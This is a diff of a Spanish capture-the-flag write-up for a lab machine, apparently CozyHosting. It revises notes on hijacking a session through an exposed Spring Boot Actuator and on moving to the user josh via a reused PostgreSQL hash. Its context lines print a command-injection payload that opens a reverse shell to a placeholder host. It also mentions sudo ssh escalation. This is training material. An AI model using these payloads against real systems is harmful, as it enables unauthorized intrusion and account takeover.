@@ -16,7 +16,7 @@ tags: [spring-boot, actuator, session-hijack, command-injection, postgres, gtfob
 
 ## TL;DR
 
-Una app **Spring Boot** detrás de nginx. El **Actuator** está expuesto sin autenticación: `/actuator/sessions` filtra los `JSESSIONID` activos y permite **secuestrar la sesión** de `kanderson`. En el panel de admin, el formulario de conexión SSH tiene **inyección de comandos** en el usuario. Del `.jar` salen credenciales de **PostgreSQL** con hashes → `josh` → `sudo ssh` (GTFOBins).
+Una app **Spring Boot** detrás de nginx. El **Actuator** está expuesto sin autenticación: `/actuator/sessions` filtra los `JSESSIONID` activos y permite **secuestrar la sesión** de `kanderson`. En el panel de admin, el formulario de conexión SSH tiene **inyección de comandos** en el usuario. Del `.jar` salen credenciales de **PostgreSQL**; la tabla `users` guarda un bcrypt que se reutiliza como `josh`, y `sudo ssh` (GTFOBins) cierra.
 
 ## Reconocimiento
 
@@ -39,10 +39,10 @@ nmap -p- -sCV <IP> -oN nmap.txt
 
 ```bash
 curl -s http://cozyhosting.htb/actuator/sessions
-# {"kanderson":"<JSESSIONID>"}
+# {"<JSESSIONID>":"kanderson","<JSESSIONID>":"UNAUTHORIZED"}
 ```
 
-Con esa cookie se entra en `/admin`, donde el formulario "Automatic SSH connection" pasa `username` y `host` a un `Runtime.exec` sin sanear:
+El JSON va **al revés de lo que parece**: la clave es el identificador de sesión y el valor, el usuario. Con esa cookie se entra en `/admin`, donde el formulario "Automatic SSH connection" pasa `username` y `host` a un `Runtime.exec` sin sanear:
 
 ```text
 username=;bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
@@ -52,7 +52,7 @@ username=;bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
 
 ## Movimiento lateral
 
-La cadena sí tiene salto lateral: de la cuenta de la aplicación a `josh`, usando el hash de PostgreSQL que sale del `.jar`. El detalle está en «Escalada de privilegios».
+- De la cuenta de la aplicación se pasa a `josh` con el hash de la tabla `users` de PostgreSQL; el `.jar` sólo aporta el acceso a la base.
 
 ## Escalada de privilegios
 
